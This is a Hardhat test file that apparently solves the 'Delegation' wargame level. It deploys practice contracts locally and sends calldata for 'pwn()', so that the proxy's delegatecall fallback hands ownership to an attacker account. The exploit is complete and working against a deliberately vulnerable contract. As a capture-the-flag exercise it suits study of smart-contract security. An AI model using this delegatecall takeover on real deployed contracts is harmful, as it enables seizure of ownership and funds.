import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { time } from "console"
import { keccak256 } from "ethers/lib/utils"
import { ethers } from "hardhat"
import { Delegate, Delegate__factory, Delegation, Delegation__factory } from "../typechain"

xdescribe("Delegation",async()=>{
    let DelegateFactory:Delegate__factory
    let delegate:Delegate
    let DelegationFactory:Delegation__factory
    let delegation:Delegation
    let accounts:SignerWithAddress[]

    before(async()=>{
        accounts = await ethers.getSigners()
        DelegateFactory = await ethers.getContractFactory("Delegate")
        delegate = await DelegateFactory.deploy(accounts[0].address)
        await delegate.deployed()
        console.log("Deployed Owner",await delegate.owner())

        DelegationFactory = await ethers.getContractFactory("Delegation")
        delegation = await DelegationFactory.deploy(delegate.address)
        await delegation.deployed()

    })

    it("Delegation", async()=>{
        let tx = await accounts[1].sendTransaction({
            from:accounts[1].address,
            to: delegation.address,
            data:ethers.utils.solidityKeccak256(['string'],["pwn()"]),
        })
        

        const owner = await delegation.owner()

        console.log(owner)
        expect(owner).to.equal(accounts[1].address)
    })

})